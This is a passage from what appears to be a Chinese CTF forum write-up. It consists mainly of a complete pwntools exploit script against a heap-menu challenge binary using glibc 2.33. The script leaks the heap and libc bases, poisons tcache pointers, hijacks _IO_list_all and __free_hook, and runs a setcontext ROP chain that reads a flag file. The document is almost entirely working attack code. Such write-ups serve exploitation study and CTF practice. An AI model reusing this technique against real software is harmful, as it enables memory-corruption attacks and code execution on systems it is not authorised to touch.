
## 利用脚本

```python
from re import L
from pwn import *
from ctypes import *
from string import *
from hashlib import *
from itertools import product
#context.log_level = 'debug'
io = process('./pwn')
#io = remote('35.246.158.241',32131)
libc = ELF('./libc-2.33.so')
elf = ELF("./pwn")
rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
sn = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
irt = lambda : io.interactive()
dbg = lambda text=None : gdb.attach(io, text)
# lg = lambda s,addr : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def menu(choice):
    sla("Choice:", str(choice))
def add(index):
    menu(1)
    sla("Index:", str(index))
def edit(index,context):
    menu(2)
    sla("Index:", str(index))
    sa("Content:", context)
def show(index):
    menu(3)
    sla("Index:", str(index))
def free(index):
    menu(4)
    sla("Index:", str(index))
#-----------------------leak heapbase--------------------------
add(0)
add(1)
free(0)
show(0)
ru("Content:")
heapbase = u64(io.recv(5).ljust(8,'\x00'))
heapbase = heapbase<<12
lg("heapbase")
#-----------------------leak libcbase------------------------------
heap = heapbase + 0x2b0
xor = heapbase>>12
free(1)
edit(1, p64(xor^heap))
add(1)
add(0)
edit(0, p64(0) + p64(0x421))
for i in range(33):
    add(0)
    free(1)
    show(1)
    ru("Content:")
    libcbase = u64(io.recv(6).ljust(8,'\x00')) - (0x7f514304ec00 - 0x7f5142e6e000)
    lg("libcbase")
io_list_all = libcbase + 0x1e15c0
io_str_jumps = libcbase + (0x7f6b247b0560 - 0x7f6b245ce000)
free_hook = libcbase + libc.sym['__free_hook']
pcop = libcbase + 0x14a0a0
lg("pcop")
setcontext = libcbase + libc.sym['setcontext']
rdi_ret = libcbase + 0x0000000000028a55
rsi_ret = libcbase + 0x000000000002a4cf
rdx_ret = libcbase + 0x00000000000c7f32
open = libcbase + libc.sym['open']
read = libcbase + libc.sym['read']
write = libcbase + libc.sym['write']
#----------------------fastbin reverse into tcache---------------------------
##---------change tcache count-----------
add(0)
add(1)
free(0)
free(1)
heap = heapbase + 0x10
edit(1, p64(xor^heap))
add(0)
add(0)
edit(0, p64(0))
##------------full fastbin----------------
add(1) #change fd
add(2) #full fastbin
free(1)
edit(0, p64(2))
edit(1, p64(xor^heapbase+0x90))
add(1)
add(1)
for i in range(7):
    edit(0, p64(0))
    add(2)
    edit(0, p64(i))
    free(2)
    edit(0, p64(0))
    add(2)
edit(0, p64(7))
free(2)
heap = heapbase + 0x400
edit(2, p64(xor^(io_list_all+0x70)))
for i in range(6):
    add(2)
    edit(0, p64(7))
    free(2)
    edit(0, p64(6-i))
    edit(0, p64(0))
edit(1, p64(io_list_all>>12))
add(2)
def change(addr,context):
    edit(0, p64(1))
    edit(1, p64(addr))
    add(2)
    edit(2, context)
length = 0x230
start = heapbase + 0x600
end = start + ((length)-100)//2
change(heapbase+0x30, p64(1)+p64(0xffffffffffff))
change(heapbase+0x40, p64(0)+p64(start))
change(heapbase+0x50, p64(end))
change(heapbase+0xd0, p64(0))
change(heapbase+0xe0, p64(0)+p64(io_str_jumps))
change(heapbase+0x1a0, p64(free_hook))
change(start, p64(pcop)+p64(heapbase+0x700))
change(heapbase+0x720, p64(setcontext+61))
change(heapbase+0x7a0, p64(heapbase+0x800)+p64(rdi_ret))
change(heapbase+0x7c0, 'flag'.ljust(0x10,'\x00'))
change(heapbase+0x800, p64(heapbase+0x7c0)+p64(rsi_ret))
change(heapbase+0x810, p64(0)+p64(open))
change(heapbase+0x820, p64(rdi_ret)+p64(3))
change(heapbase+0x830, p64(rsi_ret)+p64(heapbase+0x900))
change(heapbase+0x840, p64(rdx_ret)+p64(0x50))
change(heapbase+0x850, p64(read)+p64(rdi_ret))
change(heapbase+0x860, p64(1)+p64(write))
#----------exit--------------
edit(1, p64(free_hook))
edit(0, p64(1))
add(2)
irt()
```

最后放一个打通的结果图吧：

![图片描述](https://bbs.kanxue.com/upload/attach/202205/954038_WPTK5SZBHGDHMHA.png)

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

[#题解集锦](https://bbs.kanxue.com/forum-171-1-187.htm)

[#漏洞机制](https://bbs.kanxue.com/forum-171-1-181.htm)
